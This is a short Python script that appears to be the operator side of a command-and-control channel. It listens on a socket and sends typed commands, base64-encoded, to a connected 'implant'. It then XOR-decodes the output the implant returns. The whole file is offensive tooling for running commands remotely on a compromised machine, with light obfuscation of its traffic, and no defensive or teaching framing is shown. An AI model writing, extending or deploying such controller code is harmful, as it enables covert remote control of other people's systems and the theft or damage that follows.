import socket
import base64

def main():
    host = '127.0.0.1'
    port = 9999

    with socket.socket() as server_socket:
        server_socket.bind((host, port))
        server_socket.listen(1)
        print("Listening for connection on {}:{}".format(host, port))

        conn, addr = server_socket.accept()
        with conn:
            print("Connected by", addr)

            while True:
                # Send command to the implant
                cmd = input("Enter command: ")
                if not cmd:
                    break
                
                # Encode the command to Base64
                b64_encoded_cmd = base64.b64encode(cmd.encode()).decode()
                conn.send(b64_encoded_cmd.encode() + b'\n')

                # Receive output from the implant
                data_length = conn.recv(10).decode()
                if not data_length:
                    print("Connection ended by the client.")
                    break

                xor_encoded_output = conn.recv(int(data_length)).decode()
                # Decode the output using XOR
                output = ''.join(chr(ord(c) ^ 0x20) for c in xor_encoded_output)  # Same key as the client

                print("Output from implant:", output)

if __name__ == '__main__':
    main()
